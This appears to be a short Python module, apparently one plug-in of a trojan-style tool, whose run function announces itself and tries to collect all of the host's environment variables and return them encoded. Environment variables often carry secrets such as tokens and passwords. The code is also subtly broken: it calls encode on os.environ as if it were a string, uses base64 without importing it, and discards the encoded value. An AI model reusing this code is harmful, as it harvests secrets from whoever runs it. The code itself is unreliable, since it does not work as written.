import os
def run (**args):
	print (" [*] In environment module.")
	data_string =(os.environ)
	data_bytes = data_string.encode("utf8")
	base64.b64encode(data_bytes)
	return str(data_bytes)
